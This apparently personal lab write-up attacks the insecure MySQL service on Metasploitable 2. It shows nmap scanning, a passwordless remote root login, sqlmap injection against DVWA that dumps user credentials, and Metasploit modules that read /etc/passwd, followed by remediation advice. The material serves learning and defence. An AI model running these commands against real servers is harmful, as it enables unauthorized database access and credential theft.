# MySQL — Unauthorized Access via Default Credentials (Port 3306)

## Vulnerability Overview

| Field              | Details                                          |
|-------------------|--------------------------------------------------|
| **Service**       | MySQL Database Server                            |
| **Port**          | 3306/tcp                                         |
| **Version**       | MySQL 5.0.51a-3ubuntu5                           |
| **Severity**      | 🔴 Critical                                      |
| **Vulnerability** | No root password / Default credentials           |
| **Tool Used**     | SQLMap, MySQL Client, Metasploit                 |
| **Auth Required** | ❌ No (root has no password)                     |

---

## Environment

| Role     | OS               | IP Address      |
|----------|------------------|-----------------|
| Attacker | Kali Linux       | 192.168.133.129 |
| Target   | Metasploitable 2 | 192.168.133.128 |

---

## Background

### What is MySQL?

MySQL is an open-source **relational database management system (RDBMS)** widely used in web applications to store and retrieve structured data. It listens on **TCP port 3306** by default and accepts connections from clients over the network.

In a secure deployment:
- Root access should require a strong password
- Remote root login should be disabled
- The `bind-address` should restrict connections to localhost only

Metasploitable 2 ships with MySQL configured insecurely — the **root account has no password** and accepts remote connections, making it trivially exploitable.

### Why is This Critical?

An attacker with root-level MySQL access can:
- Read all databases and their contents
- Read arbitrary files from the OS using `LOAD_FILE()`
- Write files to the web root using `INTO OUTFILE` (webshell deployment)
- Extract credentials stored in application databases

---

## Phase 1 — Discovery

### Nmap Service Scan

```bash
nmap -sV -p 3306 192.168.133.128
```

**Output:**

```
PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
```

MySQL is confirmed open and remotely accessible.

---

## Phase 2 — Direct Access (No Password)

### SSL Conflict — Older MySQL Version

MySQL 5.0.x uses an older SSL handshake protocol incompatible with modern MySQL clients, causing a connection error:

```
ERROR 2026 (HY000): SSL connection error
```

### Fix — Skip SSL Flag

Use `--skip-ssl` to bypass the SSL negotiation issue and connect directly:

```bash
mysql -u root -h 192.168.133.128 --skip-ssl
```

**Expected Output:**

```
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 50
Server version: 5.0.51a-3ubuntu5 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql>
```

✅ **Root shell obtained with no password required.**

---

## Phase 3 — Enumeration via MySQL Client

Once connected, enumerate the server:

```sql
-- List all databases
SHOW DATABASES;

-- Check current user and privileges
SELECT user, host, password FROM mysql.user;

-- Check FILE privilege (needed for file read/write)
SHOW GRANTS FOR 'root'@'localhost';
```

**Databases discovered:**

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dvwa               |
| metasploit         |
| mysql              |
| owasp10            |
| tikiwiki           |
| tikiwiki195        |
+--------------------+
7 rows in set
```

---

## Phase 4 — SQL Injection via SQLMap (Web Layer)

The MySQL backend is also exposed through the **DVWA** web application running on port 80. The `id` GET parameter was found to be injectable.

### SQLMap Command (with SSL-compatible options for older targets)

```bash
sqlmap -u "http://192.168.133.128/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=<your-session>" \
  --dbs
```

### Vulnerable Parameter Confirmed

```
GET parameter 'id' is vulnerable.
```

### Databases Enumerated

```
available databases [7]:
[*] dvwa
[*] information_schema
[*] metasploit
[*] mysql
[*] owasp10
[*] tikiwiki
[*] tikiwiki195
```

### Dump User Credentials from DVWA

```bash
sqlmap -u "http://192.168.133.128/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=<your-session>" \
  -D dvwa -T users --dump
```

SQLMap automatically identifies and attempts to crack MD5 hashes found in the users table.

---

## Phase 5 — Metasploit Auxiliary Modules

### MySQL Login Scanner

```bash
msfconsole
msf > use auxiliary/scanner/mysql/mysql_login
msf > set RHOSTS 192.168.133.128
msf > set USERNAME root
msf > set PASSWORD ""
msf > run
```

### Execute SQL via Metasploit

```bash
msf > use auxiliary/admin/mysql/mysql_sql
msf > set RHOSTS 192.168.133.128
msf > set USERNAME root
msf > set PASSWORD ""
msf > set SQL show databases;
msf > run
```

### File Read (if FILE privilege is granted)

```bash
msf > set SQL SELECT LOAD_FILE('/etc/passwd');
msf > run
```

---

## Attack Flow Summary

```
Nmap scan            →  Port 3306 open, MySQL 5.0.51a detected
        ↓
Direct connect       →  mysql -u root -h 192.168.133.128 --skip-ssl
        ↓
SSL conflict         →  Resolved with --skip-ssl flag (older MySQL version)
        ↓
Root shell obtained  →  No password required
        ↓
SHOW DATABASES       →  7 databases enumerated
        ↓
SQLMap (web layer)   →  id parameter vulnerable in DVWA
        ↓
--dbs flag           →  All 7 databases confirmed via injection
        ↓
--dump               →  User credentials extracted from dvwa.users ✅
```

---

## Impact

| Impact | Details |
|--------|---------|
| **Full DB access** | Root-level access to all 7 databases |
| **Credential theft** | Application usernames and password hashes extracted |
| **File read** | `/etc/passwd` and other OS files readable via `LOAD_FILE()` |
| **Webshell upload** | Files writable to web root via `INTO OUTFILE` |
| **Lateral movement** | Credentials reused across other services |

---

## Remediation

| Action | Details |
|--------|---------|
| **Set a root password** | `ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongPassword';` |
| **Disable remote root login** | Bind MySQL to `127.0.0.1` only in `my.cnf` |
| **Remove anonymous accounts** | `DELETE FROM mysql.user WHERE User='';` |
| **Revoke FILE privilege** | Remove `FILE` grant from all non-admin users |
| **Firewall port 3306** | Block external access; MySQL should never be internet-facing |
| **Use least privilege** | App DB users should only access their own database |
| **Enable SSL properly** | Upgrade MySQL to a version with modern TLS support |

---

## What I Learned

- MySQL 5.0.x on Metasploitable 2 accepts remote root connections with no password
- Older MySQL versions cause SSL handshake errors with modern clients — resolved using `--skip-ssl`
- SQLMap operates at the **web application layer**, not directly against port 3306 — it exploits SQL injection vulnerabilities in web apps that query the MySQL backend
- The `LOAD_FILE()` and `INTO OUTFILE` MySQL functions are dangerous when the FILE privilege is granted to remote users
- Multiple attack paths exist: direct client connection, SQLMap via web app, and Metasploit auxiliary modules
- Always enumerate all databases — `metasploit`, `tikiwiki`, and `owasp10` may contain additional sensitive data

---

## References

- [MySQL Security Documentation](https://dev.mysql.com/doc/refman/5.7/en/security.html)
- [SQLMap Official Documentation](https://sqlmap.org/)
- [Rapid7 — MySQL Login Scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/mysql/mysql_login/)
- [Metasploitable 2 Guide — Rapid7](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
